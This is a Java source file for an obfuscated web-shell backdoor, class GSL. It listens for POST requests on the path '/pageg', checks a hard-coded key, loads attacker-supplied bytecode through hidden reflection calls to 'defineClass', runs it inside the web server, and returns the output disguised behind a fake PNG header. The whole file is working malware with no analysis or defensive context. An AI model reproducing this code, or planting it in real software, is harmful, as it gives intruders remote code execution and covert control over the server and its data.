package com.sf.sl;

import com.sf.redefine.MyRequest;
import com.sf.redefine.MyResponse;
import com.sf.redefine.MyServletOutputStream;
import com.sf.redefine.MySession;

public class GSL {
    private static final String pathPattern= "/pageg";
    private static final String px = "1a539a061fa9458e2b869c3cf8be6d99";
    private static byte[] Decrypt(byte[] data) {
        if (data.length == 0) {
            return data;
        } else {
            try {
                java.io.ByteArrayInputStream t = new java.io.ByteArrayInputStream(data);
                java.util.zip.GZIPInputStream i = new java.util.zip.GZIPInputStream(t, data.length);
                return r(i);
            } catch (Exception ignored) {

            }
        }
        return data;
    }
    private static byte[] Encrypt(byte[] data) {
        try {
            java.io.ByteArrayOutputStream o = new java.io.ByteArrayOutputStream();
            java.util.zip.GZIPOutputStream g = new java.util.zip.GZIPOutputStream(o);
            g.write(data);
            g.close();
            return o.toByteArray();
        } catch (Exception ignored) {

        }return data;
    }
    private static byte[] r(java.io.InputStream i) {
        byte[] temp = new byte[1024];
        java.io.ByteArrayOutputStream b = new java.io.ByteArrayOutputStream();
        int n;
        try {
            while((n = i.read(temp)) != -1) {b.write(temp, 0, n);
            }} catch (Exception ignored) {
        }
        return b.toByteArray();
    }


    public static void doService(Object obj, String url,String method, java.io.InputStream in){
        if (url.matches(pathPattern)){
            if (method.equals("POST")){
                java.util.Map objMap = (java.util.Map)obj;
                Object request = objMap.get("request");
                Object response = objMap.get("response");
                ClassLoader loader = GSL.class.getClassLoader();
                try {
                    byte[] ds = r(in);
                    byte[] dr = new byte[ds.length - 208];
                    System.arraycopy(ds, 149, dr, 0, dr.length);
                    byte[] x = new byte[dr.length - 64];
                    System.arraycopy(dr, 64, x, 0, x.length);
                    dr = Decrypt(x);
                    byte[] p = new byte[32];
                    System.arraycopy(dr, dr.length - 32, p, 0, p.length);
                    byte[] data = new byte[dr.length - 32];
                    System.arraycopy(dr, 0, data, 0, data.length);
                    if (java.util.Arrays.equals(p, px.getBytes())) {
                        if (MySession.getAttribute(MyRequest.getSession(request), "ve") == null) {
                            Class cc = Class.forName("c" + new String(new byte[]{111, 109, 46, 115, 117, 110, 46, 106, 109, 120, 46, 114, 101, 109, 111, 116, 101, 46, 117, 116, 105, 108, 46, 79, 114, 100, 101, 114, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114}) + "s");
                            Object a = Thread.currentThread().getContextClassLoader();
                            Object b = cc.getDeclaredConstructor(new Class[]{ClassLoader.class, ClassLoader.class}).newInstance(a, a);
                            java.lang.reflect.Method c = cc.getSuperclass().getDeclaredMethod("d" + new String(new byte[]{101, 102, 105, 110, 101, 67, 108, 97, 115}) + "s", byte[].class, int.class, int.class);
                            c.setAccessible(true);
                            Class zz = (Class) c.invoke(b, new Object[]{data, 0, data.length});
                            MySession.setAttribute(MyRequest.getSession(request), "ve", zz);
                        } else {
                            MySession.setAttribute(MyRequest.getSession(request), "p" + new String(new byte[]{97, 114, 97, 109, 101, 116, 101, 114}) + "s", data);
                            Object f = ((Class) MySession.getAttribute(MyRequest.getSession(request), "ve")).newInstance();
                            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                            f.equals(arrOut);
                            f.equals(data);
                            f.equals(request);
                            f.toString();
                            byte[] o = Encrypt(arrOut.toByteArray());
                            byte[] i = new byte[]{-119, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82, 0, 0, 1, -108, 0, 0, 0, -124, 8, 6, 0, 0, 0, -73, 100, -35};
                            byte[] ox = new byte[o.length + i.length];
                            System.arraycopy(i, 0, ox, 0, i.length);
                            System.arraycopy(o, 0, ox, i.length, o.length);
                            MyResponse.setHeader(response, "Content-Type", "application/octet-stream");
                            java.io.OutputStream so = (java.io.OutputStream) MyResponse.getOutputStream(response);
                            MyServletOutputStream.write(so, ox, 0, ox.length);
                            MyServletOutputStream.flush(so);
                            MyServletOutputStream.close(so);
                        }
                    }
                } catch (Exception ignored) {
                }
            }
        }
    }
}
